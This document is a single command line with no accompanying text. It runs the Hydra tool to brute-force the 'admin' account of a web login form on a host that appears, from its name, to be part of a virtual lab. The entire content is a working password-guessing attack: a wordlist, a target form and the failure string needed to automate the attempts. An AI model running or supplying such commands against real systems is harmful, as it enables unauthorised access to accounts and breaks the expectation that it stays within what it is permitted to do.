hydra -l admin -P passwords.txt snf-3406.vlab.ac.ke http-form-post "/login.php:user_field=^USER^&pass_field=^PASS^&Login=Login:Incorrect username or password"
